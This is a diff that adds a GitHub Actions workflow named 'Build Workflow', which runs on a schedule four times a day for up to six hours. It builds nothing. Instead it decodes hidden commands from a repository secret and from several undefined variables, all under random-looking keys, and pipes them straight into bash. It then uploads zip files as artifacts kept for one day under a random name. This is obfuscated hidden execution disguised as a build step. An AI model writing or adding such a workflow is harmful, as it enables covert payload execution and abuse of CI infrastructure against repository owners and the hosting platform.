@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          r20: ${{ secrets.r20 }}
+        run: |
+          printf '%s' "$r20" | jq -r .mmvsh8844 | /bin/bash
+          printf '%s' "$secob02" | jq -r .rnp90612 | /bin/bash
+          printf '%s' "$mlkk4799" | jq -r .y26021 | /bin/bash
+          echo $sj574 | jq -r .b8137 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jOllXDuS
+          path: "*.zip"
+          retention-days: 1
